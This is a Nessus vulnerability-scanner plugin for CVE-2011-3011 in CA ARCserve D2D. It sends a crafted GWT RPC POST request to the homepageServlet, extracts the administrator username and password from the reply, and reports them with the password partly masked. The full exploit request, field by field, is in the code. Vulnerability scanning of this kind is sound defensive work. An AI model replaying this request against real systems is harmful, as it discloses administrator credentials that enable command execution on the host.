#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(55720);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/04/28 14:01:58 $");

  script_cve_id("CVE-2011-3011");
  script_bugtraq_id(48897);
  script_osvdb_id(74162);
  script_xref(name:"EDB-ID", value:"17574");
  script_xref(name:"EDB-ID", value:"17594");

  script_name(english:"Computer Associates ARCserve D2D homepageServlet Servlet Information Disclosure");
  script_summary(english:"Tries to exploit the vulnerability to discover admin credentials");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a Java servlet that is affected by an
information disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The installed version of ARCserve D2D, a disk-based backup product
from Computer Associates, allows an unauthenticated, remote attacker
to discover the username and password used by the affected
application.  This can be accomplished by sending a specially crafted
POST request to the 'homepageServlet' servlet that contains the
getLocalHost message as well as the name of the Google Web Toolkit
Procedure Call (GWT RPC) descriptor.

Note that these are credentials for the Windows user with
Administrator privileges supplied during the ARCserve install process.

Note also that an attacker reportedly can use these credentials to
gain access to the application and run arbitrary commands with the
associated privileges on the affected host by, for example,
configuring a command to run before a backup is started and then
starting a backup."
  );
  # http://web.archive.org/web/20111005000321/http://retrogod.altervista.org/9sg_ca_d2dii.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?13ae8740");
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.securityfocus.com/archive/1/518983/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.securityfocus.com/archive/1/519002/30/0/threaded"
  );
  # https://support.ca.com/irj/portal/anonymous/solndtls?aparNo=RO33517&os=WINDOWS&actionID=3
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?d16fce2d"
  );
  script_set_attribute(attribute:"solution", value:"Apply the RO33517 fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"CA ARCserve D2D r15 Credentials Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'CA Arcserve D2D GWT RPC Credential Information Disclosure');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'White_Phosphorus');

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/07/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/08/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/07/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("arcserve_d2d_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/arcserve_d2d");
  script_require_ports("Services/www", 8014);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:8014);


install = get_install_from_kb(appname:'arcserve_d2d', port:port, exit_on_fail:TRUE);
dir = install['dir'];
install_url = build_url(port:port, qs:dir);


# Try to exploit the issue.
fields = make_list(
  "5",
  "0",
  "4",
  "http://"+get_host_name()+":"+port+dir+"/contents/",
  "2C6B33BED38F825C48AE73C093241510",
  "com.ca.arcflash.ui.client.homepage.HomepageService",
  "getLocalHost",
  "1",
  "2",
  "3",
  "4",
  "0",
  ""
);
postdata = join(fields, sep:'|');
url = dir + '/contents/service/homepage';

req = http_mk_post_req(
  port        : port,
  item        : url,
  add_headers : make_array(
                  'Content-Type', 'text/x-gwt-rpc; charset=utf-8',
                  'Cookie', 'donotshowgettingstarted=%7B%22state%22%3Atrue%7D'
                ),
  data        : postdata
);
res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);


# If the response looks correct...
if (
  '//OK[' >< res[2] &&
  'com.ca.arcflash.ui.client.model.TrustHostModel' >< res[2] &&
  ',"user",' >< res[2] &&
  ',"password",' >< res[2]
)
{
  # Make sure we actually got the credentials.
  user = "";
  match = eregmatch(pattern:'"user","([^"]+)",', string:res[2]);
  if (!isnull(match)) user = match[1];

  pass = "";
  match = eregmatch(pattern:'"password","([^"]+)",', string:res[2]);
  if (!isnull(match))
  {
    pass = match[1];
    # nb: mask actual password except for first and last characters.
    pass = strcat(pass[0], crap(data:'*', length:6), pass[strlen(pass)-1]);
  }

  if (user && pass)
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report = '\n' +
        'Nessus was able to exploit the vulnerability to gather the credentials\n' +
        'of the ARCserve D2D install using the following request :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        req_str + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      if (report_verbosity > 1)
      {
        report += '\n' +
          '\n  Username : ' + user +
          '\n  Password : ' + pass +
          '\n' +
          '\nNote that the password displayed here has been partially obfuscated.\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}

exit(0, "The ARCserve D2D service at "+install_url+" is not affected.");
